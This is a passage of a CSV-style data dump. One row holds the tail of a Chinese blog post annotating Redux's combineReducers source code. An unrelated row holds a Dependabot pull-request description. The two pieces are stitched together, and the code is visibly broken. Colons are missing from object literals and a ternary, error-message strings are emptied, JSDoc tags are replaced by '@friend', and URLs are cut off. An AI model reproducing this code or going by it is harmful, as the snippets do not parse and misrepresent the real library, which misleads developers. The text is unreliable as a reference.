state&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;//将拆分过的两个 reducer 合并&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;const&lt;/span&gt; combinedReducers = combineReducers(&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;todos&lt;/span&gt;　todoReducer,&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;counter&lt;/span&gt; counterReducer&lt;/div&gt;&lt;div class=""line""&gt;&#125;)&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;let&lt;/span&gt; store = createStore(combinedReducers)&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""built_in""&gt;console&lt;/span&gt;.log(store.getState())&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;//store 结构：&#123;todos [], counter 0&#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; &lt;p&gt;如上示例，我们调用 combinedReducers 得到的 store 的结构和 传递给 combinedReducers 的对象的结构一致，接下来我们修改 state：&lt;/p&gt; &lt;figure class=""highlight js""&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=""code""&gt;&lt;pre&gt;&lt;div class=""line""&gt;store.dispatch(&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;type&lt;/span&gt; &lt;span class=""string""&gt;'ADD_TODO'&lt;/span&gt;,&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;text&lt;/span&gt; &lt;span class=""string""&gt;'Use Redux'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&#125;)&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""built_in""&gt;console&lt;/span&gt;.log(store.getState())&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;//store 结构：&#123;todos ['Use Redux'], counter 0&#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; &lt;p&gt;阅读代码后不难发现，&lt;code&gt;combinedReducers&lt;/code&gt; 处理 state 可以认为是进行了以下操作：&lt;/p&gt; &lt;figure class=""highlight js""&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=""code""&gt;&lt;pre&gt;&lt;div class=""line""&gt;store.dispatch(action);&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;store = &#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;todos&lt;/span&gt;　todoReducer(store[todos], action),&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""attr""&gt;counter&lt;/span&gt; todoReducer(store[counter], action),&lt;/div&gt;&lt;div class=""line""&gt;  ... &lt;/div&gt;&lt;div class=""line""&gt;  others othersReducer(store[others], action)&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; &lt;p&gt;&lt;code&gt;combineReducers&lt;/code&gt; 对传入的 &lt;code&gt;reducer&lt;/code&gt; 约定了一些必须遵守的规则：&lt;/p&gt; &lt;ul&gt; &lt;li&gt;如果接收到的 &lt;code&gt;state&lt;/code&gt; 是 &lt;code&gt;undefined&lt;/code&gt; ，必须对其初始化。&lt;/li&gt; &lt;li&gt;reducer 不允许返回 &lt;code&gt;undefined&lt;/code&gt;，否则会抛出异常。&lt;/li&gt; &lt;li&gt;如果 reducer 未匹配到传入的 action 则最好返回接收到的原始 store。&lt;/li&gt; &lt;li&gt;&lt;code&gt;combineReducers&lt;/code&gt; 操作的 state 必须是普通对象，不能是其他的特殊对象，如 &lt;code&gt;immutable&lt;/code&gt; 对象等。&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;当然不仅仅在使用 &lt;code&gt;combineReducers&lt;/code&gt; 是遵守这些规则，使用自定义的类似的 工具函数的时候最好也要遵守这些习惯。&lt;/p&gt; &lt;h2 id=""源码注释""&gt;&lt;a href=""#源码注释"" class=""headerlink"" title=""源码注释""&gt;&lt;/a&gt;源码注释&lt;/h2&gt;&lt;p&gt;源代码如下，加了阅读注释：&lt;/p&gt; &lt;figure class=""highlight js""&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=""code""&gt;&lt;pre&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;import&lt;/span&gt; &#123; ActionTypes &#125; &lt;span class=""keyword""&gt;from&lt;/span&gt; &lt;span class=""string""&gt;'./createStore'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;import&lt;/span&gt; isPlainObject &lt;span class=""keyword""&gt;from&lt;/span&gt; &lt;span class=""string""&gt;'lodash/isPlainObject'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;import&lt;/span&gt; warning &lt;span class=""keyword""&gt;from&lt;/span&gt; &lt;span class=""string""&gt;'./utils/warning'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;//action 没有 对应处理的 reducer 时候返回的错误信息&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""function""&gt;&lt;span class=""keyword""&gt;function&lt;/span&gt; &lt;span class=""title""&gt;getUndefinedStateErrorMessage&lt;/span&gt;(&lt;span class=""params""&gt;key, action&lt;/span&gt;) &lt;/span&gt;&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; actionType = action &amp;&amp; action.type&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; actionName = actionType &amp;&amp; &lt;span class=""string""&gt;&lt;/span&gt; || &lt;span class=""string""&gt;'an action'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;return&lt;/span&gt; (&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""string""&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  )&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// state 和 reducer 检查&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 1. reducers 至少有一个成员 reducer，不能使空对象&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 2. inputState 必须是简单对象&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 3. inputState 中的属性，必须在 reducers 中存在同属性名的 reducer&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""function""&gt;&lt;span class=""keyword""&gt;function&lt;/span&gt; &lt;span class=""title""&gt;getUnexpectedStateShapeWarningMessage&lt;/span&gt;(&lt;span class=""params""&gt;inputState, reducers, action&lt;/span&gt;) &lt;/span&gt;&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; reducerKeys = &lt;span class=""built_in""&gt;Object&lt;/span&gt;.keys(reducers)&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; argumentName = action &amp;&amp; action.type === ActionTypes.INIT ?&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""string""&gt;'preloadedState argument passed to createStore'&lt;/span&gt; &lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""string""&gt;'previous state received by the reducer'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;// combineReducers 接收的参数对象至少需要又有一个 reducer&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;if&lt;/span&gt; (reducerKeys.length === &lt;span class=""number""&gt;0&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;return&lt;/span&gt; (&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;'Store does not have a valid reducer. Make sure the argument passed '&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;'to combineReducers is an object whose values are reducers.'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    )&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;// inputState 是否是一个简单对象&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;// 简单对象是指 通过 ""&#123;&#125;"" 或者 ""new Object"" 创建的键值对的集合&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;if&lt;/span&gt; (!isPlainObject(inputState)) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;return&lt;/span&gt; (&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      (&#123;&#125;).toString.call(inputState).match(&lt;span class=""regexp""&gt;/\s([a-z|A-Z]+)/&lt;/span&gt;)[&lt;span class=""number""&gt;1&lt;/span&gt;] +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    )&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;//判断 inputState 中是否存在 key ，在 reducers 中不存在&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; unexpectedKeys = &lt;span class=""built_in""&gt;Object&lt;/span&gt;.keys(inputState).filter(&lt;span class=""function""&gt;&lt;span class=""params""&gt;key&lt;/span&gt; =&gt;&lt;/span&gt; !reducers.hasOwnProperty(key))&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;if&lt;/span&gt; (unexpectedKeys.length &gt; &lt;span class=""number""&gt;0&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;return&lt;/span&gt; (&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""string""&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    )&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// reducers 合法性检查函数，主要检查要求以下几点：&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 1. 调用 reducer 返回值不允许为 undefined&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 2. reducer 在初次调用时，即被传入类型为 ActionTypes.INIT 的 action 需要对 state 初始化&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 3. 不要处理 redux/* 这个命名空间下的action 直接返回 currentState，&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;// 这一点代码未做检查，但是需要注意，自定义的 action type 最好不要用这个命名空间&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""function""&gt;&lt;span class=""keyword""&gt;function&lt;/span&gt; &lt;span class=""title""&gt;assertReducerSanity&lt;/span&gt;(&lt;span class=""params""&gt;reducers&lt;/span&gt;) &lt;/span&gt;&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""built_in""&gt;Object&lt;/span&gt;.keys(reducers).forEach(&lt;span class=""function""&gt;&lt;span class=""params""&gt;key&lt;/span&gt; =&gt;&lt;/span&gt; &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; reducer = reducers[key]&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; initialState = reducer(&lt;span class=""literal""&gt;undefined&lt;/span&gt;, &#123; &lt;span class=""attr""&gt;type&lt;/span&gt; ActionTypes.INIT &#125;)&lt;/div&gt;&lt;div class=""line""&gt;    &lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 此处检查 reducer 是否处理值为 undefined 的 state，如果未处理，即 reducer 返回 undefined 抛出异常&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 按照约定，当传递给reducer的state为 undefined 时，通常在初始化的时候，reducer第一次被调用时，&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// state 为 undefined， 此时 reducer 需要给 state 一个默认值， 而不能返回 undefined。&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;if&lt;/span&gt; (&lt;span class=""keyword""&gt;typeof&lt;/span&gt; initialState === &lt;span class=""string""&gt;'undefined'&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;throw&lt;/span&gt; &lt;span class=""keyword""&gt;new&lt;/span&gt; &lt;span class=""built_in""&gt;Error&lt;/span&gt;(&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      )&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 声明一种随机的 action type，确保不会有人使用这种action&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 使用这么奇怪的 action 是为了检查，当传入 reducer 不认识的 action type 时，reducer 会不应该返回 undefined。&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 实际上，按照约定，当传入不认识的 action type 或者想要忽视的action type 时，返回 current state 即可&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 同时，警告信息还指出不应该处理任何 redux/* ，命名空间下的 action，除非 current state 为 undefined 的时候，需要做初始化。&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; type = &lt;span class=""string""&gt;'@@friend/PROBE_UNKNOWN_ACTION_'&lt;/span&gt; + &lt;span class=""built_in""&gt;Math&lt;/span&gt;.random().toString(&lt;span class=""number""&gt;36&lt;/span&gt;).substring(&lt;span class=""number""&gt;7&lt;/span&gt;).split(&lt;span class=""string""&gt;''&lt;/span&gt;).join(&lt;span class=""string""&gt;'.'&lt;/span&gt;)&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;if&lt;/span&gt; (&lt;span class=""keyword""&gt;typeof&lt;/span&gt; reducer(&lt;span class=""literal""&gt;undefined&lt;/span&gt;, &#123; type &#125;) === &lt;span class=""string""&gt;'undefined'&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;throw&lt;/span&gt; &lt;span class=""keyword""&gt;new&lt;/span&gt; &lt;span class=""built_in""&gt;Error&lt;/span&gt;(&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt; +&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""string""&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      )&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;  &#125;)&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;/**&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt; * Turns an object whose values are different reducer functions, into a single&lt;/div&gt;&lt;div class=""line""&gt; * reducer function. It will call every child reducer, and gather their results&lt;/div&gt;&lt;div class=""line""&gt; * into a single state object, whose keys correspond to the keys of the passed&lt;/div&gt;&lt;div class=""line""&gt; * reducer functions.&lt;/div&gt;&lt;div class=""line""&gt; *&lt;/div&gt;&lt;div class=""line""&gt; * @friend &#123;Object&#125; reducers An object whose values correspond to different&lt;/div&gt;&lt;div class=""line""&gt; * reducer functions that need to be combined into one. One handy way to obtain&lt;/div&gt;&lt;div class=""line""&gt; * it is to use ES6  syntax. The reducers may never return&lt;/div&gt;&lt;div class=""line""&gt; * undefined for any action. Instead, they should return their initial state&lt;/div&gt;&lt;div class=""line""&gt; * if the state passed to them was undefined, and the current state for any&lt;/div&gt;&lt;div class=""line""&gt; * unrecognized action.&lt;/div&gt;&lt;div class=""line""&gt; *&lt;/div&gt;&lt;div class=""line""&gt; * @friend &#123;Function&#125; A reducer function that invokes every reducer inside the&lt;/div&gt;&lt;div class=""line""&gt; * passed object, and builds a state object with the same shape.&lt;/div&gt;&lt;div class=""line""&gt; */&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;export&lt;/span&gt; &lt;span class=""keyword""&gt;default&lt;/span&gt; &lt;span class=""function""&gt;&lt;span class=""keyword""&gt;function&lt;/span&gt; &lt;span class=""title""&gt;combineReducers&lt;/span&gt;(&lt;span class=""params""&gt;reducers&lt;/span&gt;) &lt;/span&gt;&#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; reducerKeys = &lt;span class=""built_in""&gt;Object&lt;/span&gt;.keys(reducers)&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; finalReducers = &#123;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;// 把多个 reducers 合并到 finalReducers 对象中&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;for&lt;/span&gt; (&lt;span class=""keyword""&gt;var&lt;/span&gt; i = &lt;span class=""number""&gt;0&lt;/span&gt;; i &lt; reducerKeys.length; i++) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; key = reducerKeys[i]&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;if&lt;/span&gt; (&lt;span class=""keyword""&gt;typeof&lt;/span&gt; reducers[key] === &lt;span class=""string""&gt;'function'&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      finalReducers[key] = reducers[key]&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; finalReducerKeys = &lt;span class=""built_in""&gt;Object&lt;/span&gt;.keys(finalReducers)&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""comment""&gt;// 对 reducers 合法性进行检查&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;var&lt;/span&gt; sanityError&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;try&lt;/span&gt; &#123;&lt;/div&gt;&lt;div class=""line""&gt;    assertReducerSanity(finalReducers)&lt;/div&gt;&lt;div class=""line""&gt;  &#125; &lt;span class=""keyword""&gt;catch&lt;/span&gt; (e) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    sanityError = e&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;return&lt;/span&gt; &lt;span class=""function""&gt;&lt;span class=""keyword""&gt;function&lt;/span&gt; &lt;span class=""title""&gt;combination&lt;/span&gt;(&lt;span class=""params""&gt;state = &#123;&#125;, action&lt;/span&gt;) &lt;/span&gt;&#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// reducers 合法性检查存在异常抛出&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;if&lt;/span&gt; (sanityError) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;throw&lt;/span&gt; sanityError&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// state 和 reducer 检查&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 1. reducers 至少有一个成员 reducer，不能使空对象&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 2. inputState 必须是简单对象&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 3. inputState 中的属性，必须在 reducers 中存在同属性名的 reducer&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 非生产环境下打印警告日志&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;if&lt;/span&gt; (process.env.NODE_ENV !== &lt;span class=""string""&gt;'production'&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;var&lt;/span&gt; warningMessage = getUnexpectedStateShapeWarningMessage(state, finalReducers, action)&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;if&lt;/span&gt; (warningMessage) &#123;&lt;/div&gt;&lt;div class=""line""&gt;        warning(warningMessage)&lt;/div&gt;&lt;div class=""line""&gt;      &#125;&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 最终 nextState 对象的结构和 finalReducers 的结构一致&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; hasChanged = &lt;span class=""literal""&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;var&lt;/span&gt; nextState = &#123;&#125;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""comment""&gt;// 遍历 finalReducers ，为 finalReducers 的每个成员调用 reducer(subState, action)&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;for&lt;/span&gt; (&lt;span class=""keyword""&gt;var&lt;/span&gt; i = &lt;span class=""number""&gt;0&lt;/span&gt;; i &lt; finalReducerKeys.length; i++) &#123;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;var&lt;/span&gt; key = finalReducerKeys[i]&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;var&lt;/span&gt; reducer = finalReducers[key]&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;var&lt;/span&gt; previousStateForKey = state[key]&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;var&lt;/span&gt; nextStateForKey = reducer(previousStateForKey, action)&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;if&lt;/span&gt; (&lt;span class=""keyword""&gt;typeof&lt;/span&gt; nextStateForKey === &lt;span class=""string""&gt;'undefined'&lt;/span&gt;) &#123;&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""keyword""&gt;var&lt;/span&gt; errorMessage = getUndefinedStateErrorMessage(key, action)&lt;/div&gt;&lt;div class=""line""&gt;        &lt;span class=""keyword""&gt;throw&lt;/span&gt; &lt;span class=""keyword""&gt;new&lt;/span&gt; &lt;span class=""built_in""&gt;Error&lt;/span&gt;(errorMessage)&lt;/div&gt;&lt;div class=""line""&gt;      &#125;&lt;/div&gt;&lt;div class=""line""&gt;      nextState[key] = nextStateForKey&lt;/div&gt;&lt;div class=""line""&gt;      hasChanged = hasChanged || nextStateForKey !== previousStateForKey&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;return&lt;/span&gt; hasChanged ? nextState  state&lt;/div&gt;&lt;div class=""line""&gt;  &#125;&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; &lt;h2 id=""相关""&gt;&lt;a href=""#相关"" class=""headerlink"" title=""相关""&gt;&lt;/a&gt;相关&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Redux&lt;/code&gt; 源码阅读笔记：&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=""/2017/03/createStore/""&gt;createStore.js 源码阅读笔记&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""/2017/03/combineReducers/""&gt;combineReducers.js 源码阅读笔记&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""/2017/03/bindActionCreators/""&gt;bindActionCreators.js 源码阅读笔记&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""/2017/02/applyMiddleware/""&gt;applyMiddleware.js 源码阅读笔记&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""/2017/03/compose/""&gt;compose.js 源码阅读笔记&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;h2 id=""参考""&gt;&lt;a href=""#参考"" class=""headerlink"" title=""参考""&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;本文阅读代码版本 &lt;code&gt;3.5.2&lt;/code&gt; &lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="" target=""_blank"" rel=""external""&gt;redux源代码&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" target=""_blank"" rel=""external""&gt;redux文档&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;",False,True,False,test/tcatche/234
xml2csv/wmfs/11/341777670,"Updates the requirements on @friend/git to permit the latest version. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [@friend/git's releases]( See full diff in [compare view]( /&gt;  Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  If all status checks pass Dependabot will automatically merge this pull request.  ---  **Note** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.  You can always request more updates by clicking  in your [Dependabot dashboard]( commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will merge this PR after your CI passes on it -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True,False,xml2csv/wmfs/11
